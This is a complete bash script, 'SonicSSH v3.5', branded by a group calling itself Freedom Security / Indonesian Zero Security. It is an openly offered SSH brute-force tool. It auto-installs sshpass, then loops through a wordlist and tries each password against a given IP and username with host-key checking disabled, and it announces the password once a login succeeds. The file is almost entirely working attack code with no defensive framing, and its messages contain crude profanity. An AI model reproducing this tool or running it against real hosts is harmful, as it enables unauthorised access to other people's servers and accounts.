#!/bin/bash

# Text colors (as is)
black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"

light_black="\033[1;30m"
light_red="\033[1;31m"
light_green="\033[1;32m"
light_yellow="\033[1;33m"
light_blue="\033[1;34m"
light_purple="\033[1;35m"
light_cyan="\033[1;36m"
light_white="\033[1;37m"

reset="\033[0m"


sec4me() {

    if ! command -v sshpass &> /dev/null; then
        echo -e "${red}[ERROR] sshpass not installed.${reset}"
        echo -e "${cyan}[INFO] Detecting platform...${reset}"

        if [[ "$(uname -o)" == "Android" ]]; then
            echo -e "${yellow}[INFO] Detected platform: Termux${reset}"
            echo "[INFO] installing sshpass"
            pkg install -y sshpass
        elif [[ -f "/etc/debian_version" ]]; then
            echo -e "${yellow}[INFO] Detected platform: Debian/Ubuntu-based${reset}"
            echo "[INFO] installing sshpass"
            sudo apt install -y sshpass
        elif [[ -f "/etc/arch-release" ]]; then
            echo -e "${yellow}[INFO] Detected platform: Arch Linux${reset}"
            echo "[INFO] installing sshpass"
            pacman -Sy --noconfirm sshpass
        elif [[ -f "/etc/alpine-release" ]]; then
            echo -e "${yellow}[INFO] Detected platform: Alpine Linux${reset}"
            echo "[INFO] installing sshpass"
            apk add --no-cache sshpass
        else
            echo -e "${red}[ERROR] Unsupported platform. Please install sshpass manually.${reset}"
            exit 1
        fi

        echo -e "${green}[SUCCESS] sshpass installed successfully.${reset}"
    else
        echo
    fi
}

sec4me
while getopts "i:u:w:" opt; do
    case ${opt} in
        i)
            ip=$OPTARG
            ;;
        u)
            user=$OPTARG
            ;;
        w)
            w=$OPTARG
            ;;
        *)
            echo -e "Usage: $0 -i <IP> -u <username> -w <wordlist>"
            exit 1
            ;;
    esac
done

if [[ -z "$ip" || -z "$user" || -z "$w" ]]; then
    echo -e "${green}
                 _____             _      __________ __  __
                / ___/____  ____  (_)____/ ___/ ___// / / /
                \__ \/ __ \/ __ \/ / ___/\__ \\__ \ / /_/ /
               ___/ / /_/ / / / / / /__ ___/ /__/ / __  /
              /____/\____/_/ /_/_/\___//____/____/_/ /_/ ${reset}v3.5
              -----------------------------${green}
              Faster ssh Brute Force tools${reset}"
    echo -e "${cyan}             ╔════════════════════════════════════╗${reset}"
    echo -e "${cyan}             ║         ${light_green}Dev: Freedom Security${cyan}      ║${reset}"
    echo -e "${cyan}             ║         ${light_yellow}Team: IZS Group${cyan}            ║${reset}"
    echo -e "${cyan}             ╚════════════════════════════════════╝${reset}"
    echo -e "Usage: $0 -i <IP> -u <username> -w <wordlist>"
    exit 1
fi

hozo-kontol() {
    echo -e "$(date '+%H:%M:%S')"
}

clear
echo
echo -e "${green}
                 _____             _      __________ __  __
                / ___/____  ____  (_)____/ ___/ ___// / / /
                \__ \/ __ \/ __ \/ / ___/\__ \\__ \ / /_/ /
               ___/ / /_/ / / / / / /__ ___/ /__/ / __  /
              /____/\____/_/ /_/_/\___//____/____/_/ /_/ ${reset}v3.5
              -----------------------------${green}
              Faster ssh Brute Force tools${reset}"
echo
echo -e "${cyan}             ╔════════════════════════════════════╗${reset}"
echo -e "${cyan}             ║         ${light_green}Dev: Freedom Security${cyan}      ║${reset}"
echo -e "${cyan}             ║         ${light_yellow}Team: IZS Group${cyan}            ║${reset}"
echo -e "${cyan}             ╚════════════════════════════════════╝${reset}"
echo
echo -e "${reset}IP ${light_green}$ip ${reset}username ${light_green}$user ${reset}wordlist ${light_green}$w"
echo
read -p "[•] enter to start dude"

ah=1
while IFS= read -r pass; do
    sigma=$(hozo-kontol)
    echo -e "${reset}[${green}INFO${reset}] [${cyan}$sigma${reset}] attempt [${green}$ah${reset}] | IP: ${green}$ip${reset} username: ${green}$user${reset} | Trying => ${red}$pass${reset}"

    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$ip" 'exit' >/dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo
        echo -e "-----------------------------------"
        echo -e "Password found [ ${light_green}$pass ${reset}]"
        echo -e "-----------------------------------"
        echo -e "${light_green}© 2024 SonicSSH By./Freedom Security | Indonesian Zero Security${reset}"
        echo -e "-----------------------------------"
        exit 0
    fi

    ((ah++))
done < "$w"

echo -e "-----------------------------------"
echo -e "${reset}[${light_red}ERROR$reset}] ${light_red}PASSWORD INCORRECT"
echo -e "${light_yellow}Try ${reset}another wordlist motherfucker"
echo -e "-----------------------------------"
